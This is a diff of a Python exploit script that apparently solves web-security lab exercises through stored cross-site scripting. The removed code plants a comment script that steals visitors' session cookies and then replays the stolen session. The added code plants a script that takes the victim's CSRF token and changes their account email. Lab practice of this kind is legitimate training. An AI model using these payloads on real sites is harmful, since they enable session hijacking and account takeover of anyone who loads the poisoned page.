@@ -46,16 +46,13 @@ def xss_test(url, use_proxy=False):
         
         session = requests.Session()
         csrf_token = get_csrf_token(session, blog_url, proxies)
+        
         if not csrf_token:
             print("Failed to get CSRF token")
             return False, None
             
+        
         create_comment(url, proxies, csrf_token, session, comment_url)
-        session_data = extract_session_cookie(blog_url, proxies, session)   
-        
-        cookies = {'session': session_data}
-        requests.get(url, cookies=cookies, proxies=proxies, verify=False, timeout=30)
-        
         return is_solved(url, proxies)
 
     except requests.exceptions.RequestException as e:
@@ -66,28 +63,26 @@ def create_comment(url, proxies, csrf_token, session, post_url):
     print("Creating comment with XSS payload")
     
     base_url = url.rstrip('/')
-    comment_endpoint = f"{base_url}/post/comment"
     
     comment = f'''
-    <script>
-        window.onload = function() {{
-            let csrf_token = document.getElementsByName("csrf")[0].getAttribute("value");
+        <script>
+            window.onload = function() {{
+                let csrf_token = document.getElementsByName("csrf")[0].value;
 
-            let data = new FormData();
-            data.append("postId", "1");
-            data.append("csrf", csrf_token);
-            data.append("comment", document.cookie);
-            data.append("name", "kurabiye");
-            data.append("email", "asd@asd.com");
-            data.append("website", "https://www.google.com");
-            
-            fetch("{comment_endpoint}", {{
-                method: "POST",
-                mode: "no-cors",
-                body: data
-            }});
-        }}
-    </script>'''
+                let data = new FormData();
+                data.append('csrf', csrf_token);
+                data.append('email', 'aszqwerdasd@gmail.com');
+                
+                fetch('{base_url}/my-account/change-email', {{
+                    method: 'POST',
+                    body: data
+                }})
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+            }}
+        </script>
+    '''
 
     payload = {
         "postId": "1",
@@ -108,27 +103,6 @@ def create_comment(url, proxies, csrf_token, session, post_url):
         print(f"The comment could not sent, status code: {response.status_code}")
         return False, response
 
-def extract_session_cookie(blog_url, proxies, session):
-    response = session.get(blog_url, proxies=proxies, verify=False, timeout=30)
-    if response.status_code != 200:
-        print("Failed to get post page")
-        return None
-        
-    print("Extracting session data from the page")
-    soup = BeautifulSoup(response.text, 'html.parser')
-    
-    p_tags = soup.find_all('p')
-    for p_tag in p_tags:
-        if 'secret' in p_tag.text.lower():
-            try:
-                session_data = p_tag.text.split('session=')[1].split(';')[0].strip()
-                print(f"Session Value: {session_data}")
-                return session_data 
-            except IndexError:
-                print("Session information could not be extracted.")
-    
-    print("No session data found in the page")
-    return None
 
 def is_solved(url, proxies):
     try:
@@ -140,7 +114,7 @@ def is_solved(url, proxies):
         return False, None
 
 def main():
-    parser = argparse.ArgumentParser(description='XSS Test for Lab 22')
+    parser = argparse.ArgumentParser(description='XSS Test for Lab 24')
     parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
     parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
     args = parser.parse_args()
